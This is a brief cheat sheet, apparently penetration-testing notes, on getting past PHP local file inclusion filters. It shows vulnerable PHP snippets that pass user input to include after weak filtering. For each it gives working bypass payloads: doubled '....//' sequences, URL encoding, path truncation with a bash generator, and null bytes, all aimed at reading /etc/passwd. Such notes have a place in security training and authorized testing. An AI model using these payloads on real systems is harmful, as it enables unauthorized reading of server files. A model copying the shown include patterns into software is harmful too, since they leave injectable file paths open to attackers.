## Non-Recursive Path Traversal Filters
Deletes substrings of ../ to avoid path traversals
```php
$language = str_replace('../', '', $_GET['language']);
```

Solution:
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
....////....////....////etc/passwd
```

## Encoding

**../
```
%2e%2e%2f
```


## Approved Paths
Developers use regex to make sure the file is under the ./languages directory:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Solution:
1. Fuzz for directories
2. Examine requests sent by the existing forms


## Appended Extension (.php)
Only work before PHP version 5.3/5.4:

**Path Truncation
1. Start with a non-existent directory
2. Reach 4096 characters to truncate the .php
```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```
```
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

**Null Bytes
Only works before PHP version 5.5:

End string with a null byte
```
/etc/passwd%00
```


